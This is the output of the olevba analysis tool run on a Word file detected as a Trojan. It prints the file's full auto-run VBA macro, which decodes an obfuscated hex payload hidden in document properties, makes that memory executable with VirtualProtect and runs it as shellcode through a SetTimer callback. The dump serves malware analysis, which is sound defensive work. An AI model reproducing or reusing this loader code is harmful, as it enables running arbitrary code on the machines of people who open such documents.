olevba 0.60.1 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: HEUR-Trojan.MSOffice.Shelod.gen-b6fdd6ea02585d7e8e7dcab354dcc601ecb302d3354d0d07b99591694fedcab5
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: HEUR-Trojan.MSOffice.Shelod.gen-b6fdd6ea02585d7e8e7dcab354dcc601ecb302d3354d0d07b99591694fedcab5 - OLE stream: 'VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
#If VBA7 Then
Private Declare PtrSafe Function AsyllabicalCorpulence Lib "user32" Alias "KillTimer" (ByVal ElectroimpulsePromotiveLabiovelarisation As LongPtr, ByVal RiskedDyspepsiesKitted As LongPtr) As LongPtr
#Else
Private Declare Function CrownbandGauzewing Lib "user32" Alias "SetTimer" ( ByVal MooriestNoneloquence As Long, ByVal RhondaDeigned As Long, ByVal CamletTrignesses As Long, ByVal CurationImbarked As Any) As Long
#End If
#If VBA7 Then
Private Declare PtrSafe Function CrownbandGauzewing Lib "user32" Alias "SetTimer" (ByVal PeachblowEskualdunUncandled As LongPtr, ByVal DysphemizedStylets As LongPtr, ByVal NonmeteorologicPrecurse As LongPtr, ByVal VicecomesPresidentes As LongPtr) As LongPtr
Private Declare PtrSafe Function BacksetsStenchier Lib "kernel32" Alias "VirtualProtect" (ByVal MetronQuinquesectUnrecurrent As LongPtr, ByVal AnastomoticAutogenouslyCarabideous As LongPtr, ByVal LivedLoiteringly As LongPtr, UngenteelyDansy As LongPtr) As LongPtr
#Else
Private Declare Function BacksetsStenchier Lib "kernel32" Alias "VirtualProtect"  (ByVal DiagonalsCholedochotomyJeeps As Long, ByVal NorthwestwardlyErgasticNonamenableness As Long, ByVal EnnuisNonbeauty As Long, DarkroomsSplenopneumoniaPlimsol As Long) As Long
Private Declare Function AsyllabicalCorpulence Lib "user32" Alias "KillTimer" ( ByVal SubchondralBeadhouse As Long, ByVal PantologicalMetamorphotic As Long) As Long
#End If
Private Sub Document_Open()
Dim GutlikeSubbrachiate() As Byte
#If Win64 Then
GutlikeSubbrachiate = SphincteroscopeTaskmaster(ActiveDocument.BuiltInDocumentProperties(UXYmNTYDK("KwsZAtUfmw23l")).Value)
#Else
GutlikeSubbrachiate = SphincteroscopeTaskmaster(ActiveDocument.BuiltInDocumentProperties(UXYmNTYDK("XSmjFYx")).Value)
#End If
#If VBA7 Then
Dim PainfullyCudweed As LongPtr
Dim OverfatigueFurfuranHistoriography As LongPtr
Dim ResinatingPeddlinglyDribblers As LongPtr
Dim CannelsMouthpiece As LongPtr
#Else
Dim PainfullyCudweed As Long
Dim OverfatigueFurfuranHistoriography As Long
Dim ResinatingPeddlinglyDribblers As Long
Dim CannelsMouthpiece As Long
#End If
OverfatigueFurfuranHistoriography = UBound(GutlikeSubbrachiate) + 1
ResinatingPeddlinglyDribblers = VarPtr(GutlikeSubbrachiate(0))
BacksetsStenchier ResinatingPeddlinglyDribblers, OverfatigueFurfuranHistoriography, 64, VarPtr(PainfullyCudweed)
GetObject(UXYmNTYDK("hsLsywZ93")).Environment(UXYmNTYDK("YLe1uM4"))(UXYmNTYDK("qvJDs9Zf4Ct")) = ActiveDocument.FullName
GetObject(UXYmNTYDK("YIr2qRDx")).Environment(UXYmNTYDK("Ss0sZnDEpR"))(UXYmNTYDK("HDNv_FidaS")) = UXYmNTYDK("iGSqzRwvG")
CannelsMouthpiece = CrownbandGauzewing(0, ResinatingPeddlinglyDribblers, 1, ResinatingPeddlinglyDribblers)
PhlegmasiaNoninhabitablePawkiness 1
AsyllabicalCorpulence 0, CannelsMouthpiece
GetObject(UXYmNTYDK("CNTPyKjGwj")).Environment(UXYmNTYDK("qipq6D3tT")).Remove (UXYmNTYDK("SqYeKGKVf"))
GetObject(UXYmNTYDK("PwlFYiKE5HA")).Environment(UXYmNTYDK("gDGiTQaC5b96")).Remove (UXYmNTYDK("XnPrHWFl9oD"))
ReDim GutlikeSubbrachiate(1)
End Sub
Sub PhlegmasiaNoninhabitablePawkiness(Finish)
Dim EnzymBaronduki As Long
Dim MenaccaniteLophophoralSerene As Long
MenaccaniteLophophoralSerene = Timer() + (Finish)
Do
EnzymBaronduki = Timer()
DoEvents
Loop Until EnzymBaronduki > MenaccaniteLophophoralSerene
End Sub
Function EulogisticalInditers(ParliamentarismShereefElectrizer, ProselytisedBlackbush)
EulogisticalInditers = Mid(ParliamentarismShereefElectrizer, ProselytisedBlackbush + 1, 1)
End Function
Function BuckaroosGanglanderBowwow(VocablesContinentalIodols) As Long
If Int(Rnd(23)) > 2 Then
BuckaroosGanglanderBowwow = 9000
Else
BuckaroosGanglanderBowwow = Len(VocablesContinentalIodols)
End If
End Function
Public Function UXYmNTYDK(strInput)
UXYmNTYDK = StrReverse(ActiveDocument.CustomDocumentProperties(strInput))
End Function
Function SphincteroscopeTaskmaster(SimblotWhisperproofKeelfat)
ReDim SulphocarbamicMyrothamnaceae(BuckaroosGanglanderBowwow(SimblotWhisperproofKeelfat) - 1) As Byte
Dim IntermittinglySpoilages As Long, OrinasalsEluctate As Long
Dim NonculturedFishful: NonculturedFishful = UXYmNTYDK("izlceyTpT08zO") & UXYmNTYDK("nFKVj0sHxRj")
For IntermittinglySpoilages = 0 To BuckaroosGanglanderBowwow(SimblotWhisperproofKeelfat) - 1 Step 2
OrinasalsEluctate = IntermittinglySpoilages / 2
SulphocarbamicMyrothamnaceae(OrinasalsEluctate) = CDec(NonculturedFishful & EulogisticalInditers(SimblotWhisperproofKeelfat, IntermittinglySpoilages) & EulogisticalInditers(SimblotWhisperproofKeelfat, IntermittinglySpoilages + 1))
Next
SphincteroscopeTaskmaster = SulphocarbamicMyrothamnaceae
End Function
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Environment         |May read system environment variables        |
|Suspicious|GetObject           |May get an OLE object with a running instance|
|Suspicious|Lib                 |May run code from a DLL                      |
|Suspicious|VirtualProtect      |May inject code into another process         |
|Suspicious|SetTimer            |May run a shellcode in memory                |
|Suspicious|StrReverse          |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

